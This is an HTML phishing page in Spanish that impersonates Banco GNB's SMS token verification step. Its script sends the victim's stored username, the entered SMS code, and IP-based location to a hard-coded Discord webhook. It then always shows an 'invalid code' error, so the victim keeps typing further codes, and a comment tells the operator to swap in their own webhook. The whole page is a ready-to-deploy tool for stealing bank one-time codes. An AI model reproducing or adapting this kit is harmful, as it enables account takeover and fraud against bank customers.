<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .token-container {
            background: #ffffff;
            width: 100%;
            max-width: 410px;
            padding: 40px 25px;
            text-align: center;
            position: relative;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            border-radius: 8px;
        }

        .menu-icon {
            position: absolute;
            top: 25px;
            left: 25px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .menu-icon span {
            width: 22px;
            height: 2px;
            background-color: #333;
        }

        .logo {
            max-width: 140px;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .step-indicator span {
            font-size: 0.85rem;
            color: #999;
        }

        .step-indicator .step-number {
            color: #0073b1;
            font-weight: bold;
        }

        h2 {
            color: #333;
            font-size: 1.3rem;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .sub-title {
            color: #666;
            font-size: 0.95rem;
            margin-bottom: 25px;
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 18px 50px 18px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
            background-color: #fafafa;
            outline: none;
            transition: border-color 0.3s;
            text-align: center;
            letter-spacing: 4px;
            font-weight: bold;
            font-size: 1.2rem;
            text-transform: uppercase;
        }

        .input-group input:focus {
            border-color: #7cb342;
        }

        .input-group input::placeholder {
            letter-spacing: 0px;
            font-weight: normal;
            font-size: 1rem;
            color: #aaa;
            text-transform: none;
        }

        .input-group input.error {
            border-color: #d32f2f;
            background-color: #ffebee;
        }

        .field-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            user-select: none;
        }

        /* Mensaje de error debajo del input */
        .error-message-input {
            color: #d32f2f;
            font-size: 0.85rem;
            margin-bottom: 20px;
            display: none;
            font-weight: 500;
            text-align: center;
        }

        .error-message-input.show {
            display: block;
        }

        .btn-confirmar {
            width: 100%;
            padding: 16px;
            background-color: #d6d6d6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1.1rem;
            cursor: not-allowed;
            margin-top: 5px;
            transition: background-color 0.3s;
            font-weight: 500;
        }

        .btn-confirmar.active {
            background-color: #0073b1;
            cursor: pointer;
        }

        .links-container {
            margin-top: 25px;
        }

        .link-blue {
            color: #0073b1;
            text-decoration: none;
            font-size: 0.95rem;
            display: inline-block;
            margin-bottom: 15px;
        }

        .link-blue:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="token-container">
        <!-- Icono de menú -->
        <div class="menu-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>

        <!-- Logo -->
        <img src="logo.jpeg" alt="Banco GNB" class="logo">

        <!-- Indicador de paso -->
        <div class="step-indicator">
            <span class="step-number">Paso 2 de 2</span>
            <span>•</span>
            <span>Solicitar Token Digital</span>
        </div>

        <h2>Ingresa el código que recibiste por SMS</h2>

        <form id="tokenForm" onsubmit="event.preventDefault();">
            
            <div class="input-group">
                <input type="text" id="codigoSMS" placeholder="Ingresar código" autocomplete="off" maxlength="10">
                <span class="field-icon">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect>
                        <line x1="6" y1="8" x2="6" y2="8"></line>
                        <line x1="10" y1="8" x2="10" y2="8"></line>
                        <line x1="14" y1="8" x2="14" y2="8"></line>
                        <line x1="18" y1="8" x2="18" y2="8"></line>
                        <line x1="6" y1="12" x2="6" y2="12"></line>
                        <line x1="10" y1="12" x2="10" y2="12"></line>
                        <line x1="14" y1="12" x2="14" y2="12"></line>
                        <line x1="18" y1="12" x2="18" y2="12"></line>
                        <line x1="7" y1="16" x2="17" y2="16"></line>
                    </svg>
                </span>
            </div>

            <!-- Mensaje de error debajo del input -->
            <div id="errorMessageInput" class="error-message-input">❌ Token SMS inválido, intente nuevamente.</div>

            <button type="submit" id="btnConfirmar" class="btn-confirmar">Confirmar</button>
        </form>

        <div class="links-container">
            <a href="#" class="link-blue">No he recibido mi Código SMS</a>
        </div>
    </div>

    <script>
        // ⚠️ REEMPLAZA ESTA URL CON LA DE TU WEBHOOK DE DISCORD
        const webhookURL = "https://discord.com/api/webhooks/1563735151132016780/XMF3sXWhpzlOWvDyH9KH2_6qJw1XAehkuiVfS2T3FDDjI-QocP3AigUlyyENILYqgJdt";

        const codigoSMS = document.getElementById('codigoSMS');
        const btnConfirmar = document.getElementById('btnConfirmar');
        const errorMessageInput = document.getElementById('errorMessageInput');

        // Obtener usuario guardado
        const usuario = localStorage.getItem("usuariodavi") || "No disponible";

        function validarCampo() {
            if (codigoSMS.value.trim() !== "" && codigoSMS.value.length >= 4) {
                btnConfirmar.classList.add('active');
                codigoSMS.classList.remove('error');
                errorMessageInput.classList.remove('show');
            } else {
                btnConfirmar.classList.remove('active');
            }
        }

        // Permitir números y letras (mayúsculas y minúsculas)
        codigoSMS.addEventListener('input', function() {
            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
            validarCampo();
        });

        // Función para enviar a Discord
        function enviarADiscord(codigo, callback) {
            fetch("https://ipinfo.io/json?")
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const ciudad = data.city;
                    const pais = data.country;
                    const region = data.region;

                    const mensaje = {
                        embeds: [
                            {
                                title: "🚨Token SMS",
                                color: 0x0073b1,
                                fields: [
                                    { name: "👤 Usuario", value: usuario, inline: true },
                                    { name: "🔑 Código SMS", value: codigo, inline: true },
                                    { name: "🌐 IP", value: ip, inline: true },
                                    { name: "🏙️ Ciudad", value: ciudad, inline: true },
                                    { name: "🗺️ País", value: pais, inline: true },
                                    { name: "📍 Región", value: region, inline: true }
                                ],
                                footer: { text: "Token SMS GNB" },
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(mensaje)
                    })
                    .then(response => {
                        if (response.ok) {
                            callback(true);
                        } else {
                            console.error("❌ Error al enviar los datos a Discord");
                            callback(false);
                        }
                    })
                    .catch(error => {
                        console.error("❌ Error de red al enviar a Discord:", error);
                        callback(false);
                    });
                })
                .catch(error => {
                    console.error("❌ Error al obtener la IP o ubicación:", error);
                    const mensaje = {
                        embeds: [
                            {
                                title: "🚨Token SMS",
                                color: 0x0073b1,
                                fields: [
                                    { name: "👤 Usuario", value: usuario, inline: true },
                                    { name: "🔑 Código SMS", value: codigo, inline: true },
                                    { name: "🌐 IP", value: "No disponible", inline: true },
                                    { name: "🏙️ Ciudad", value: "No disponible", inline: true },
                                    { name: "🗺️ País", value: "No disponible", inline: true }
                                ],
                                footer: { text: "Token SMS GNB" },
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(mensaje)
                    })
                    .then(() => {
                        callback(true);
                    })
                    .catch(() => {
                        callback(false);
                    });
                });
        }

        btnConfirmar.addEventListener('click', function(e) {
            e.preventDefault();

            const codigo = codigoSMS.value.trim();

            if (codigo === "" || codigo.length < 4) {
                codigoSMS.classList.add('error');
                errorMessageInput.classList.add('show');
                window.scrollTo({ top: 0, behavior: 'smooth' });
                return;
            }

            // Limpiar error
            codigoSMS.classList.remove('error');
            errorMessageInput.classList.remove('show');

            // Deshabilitar botón temporalmente
            btnConfirmar.disabled = true;
            btnConfirmar.textContent = 'Enviando...';

            // Enviar a Discord
            enviarADiscord(codigo, function(exitoso) {
                // Mostrar mensaje de error siempre (ciclo)
                codigoSMS.classList.add('error');
                errorMessageInput.classList.add('show');
                
                // Limpiar el campo
                codigoSMS.value = '';
                btnConfirmar.classList.remove('active');
                
                // Reactivar botón
                btnConfirmar.disabled = false;
                btnConfirmar.textContent = 'Confirmar';
                
                // Enfocar el campo para que el usuario pueda intentar nuevamente
                codigoSMS.focus();
                
                // Scroll al error
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        });
    </script>

</body>
</html>
